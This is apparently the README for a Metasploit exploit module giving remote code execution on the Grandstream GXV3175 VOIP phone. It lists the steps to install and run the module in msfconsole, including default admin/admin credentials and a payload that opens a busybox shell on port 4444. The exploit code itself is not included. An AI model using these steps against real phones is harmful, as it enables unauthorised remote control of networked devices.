Remote code execution for Grandstream GXV3175 VOIP phone.

===  INSTALLATION ===

copy the files to the same directory structure under the metasploit top level dir

=== USE ===

in msfconsole

---

use exploits/linux/http/grandstream_gxv3175_cmd_exec

set RHOST 192.168.0.1

set USERNAME & PASSWORD if required (defaults set to admin / admin)

run

--- 

Also comes with a (default) custom payload to spawn a busybox shell on port 4444

